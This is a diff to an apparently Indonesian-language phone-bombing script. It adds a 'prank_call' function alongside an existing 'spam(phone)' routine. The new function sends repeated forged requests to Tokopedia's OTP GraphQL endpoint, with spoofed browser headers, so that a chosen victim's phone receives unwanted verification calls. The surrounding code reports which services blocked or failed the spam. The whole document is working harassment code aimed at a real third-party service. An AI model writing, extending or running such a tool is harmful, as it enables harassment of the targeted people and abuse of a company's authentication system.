@@ -1,5 +1,9 @@
-import threading
+import os, sys, time, threading
+from datetime import datetime
+from config import _x
+from junk import G, C, Y, R, P, W, N, _u
 
+COLORS = ["\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m"]
 LOADING = True
 
 def loading_loop():
@@ -45,7 +49,6 @@ def spam(phone):
     blocked = []
     failed = []
     
-    # Start loading thread
     LOADING = True
     t = threading.Thread(target=loading_loop)
     t.start()
@@ -83,7 +86,6 @@ def spam(phone):
                 failed.append(name)
             time.sleep(speed)
     
-    # Stop loading thread
     LOADING = False
     t.join()
     sys.stdout.write("\r" + " " * 40 + "\r")
@@ -93,4 +95,40 @@ def spam(phone):
     if blocked: print(f"  {Y}⊗ Diblokir ({len(blocked)}): {', '.join(blocked)}{N}")
     if failed: print(f"  {R}✗ Gagal ({len(failed)}): {', '.join(failed)}{N}")
     
+    input(f"\n  {W}[Enter] Kembali...{N}")
+
+def prank_call(phone):
+    global LOADING
+    print(f"\n  {C}[*] Target : {phone}{N}")
+    try:
+        count = int(input(f"  {C}[?] Jumlah panggilan (1-5): {N}").strip() or "3")
+        if count < 1: count = 1
+        if count > 5: count = 5
+    except:
+        count = 3
+    
+    print(f"\n  {C}[*] Nelpon {count}x via Tokopedia...{N}\n")
+    
+    Q = "query OTPRequest($a:String!,$b:String,$c:String,$d:String,$e:Int){OTPRequest:OTPRequestV2(otpType:$a,mode:$b,msisdn:$c,email:$d,otpDigit:$e){success message}}"
+    url = "https://gql.tokopedia.com/graphql/OTPRequest"
+    
+    LOADING = True
+    t = threading.Thread(target=loading_loop)
+    t.start()
+    
+    for i in range(count):
+        try:
+            import requests as _rr
+            h = {"Content-Type":"application/json","Origin":"https://www.tokopedia.com","Referer":"https://www.tokopedia.com/login","tokopedia-lite":"otp","User-Agent":_u()}
+            b = {"operationName":"OTPRequest","query":Q,"variables":{"a":"116","b":"phone","c":phone[1:],"d":"","e":6}}
+            _rr.post(url, json=b, headers=h, timeout=15)
+        except:
+            pass
+        time.sleep(5)
+    
+    LOADING = False
+    t.join()
+    sys.stdout.write("\r" + " " * 40 + "\r")
+    
+    print(f"  {G}✓ Selesai. Target ditelepon {count}x.{N}")
     input(f"\n  {W}[Enter] Kembali...{N}")
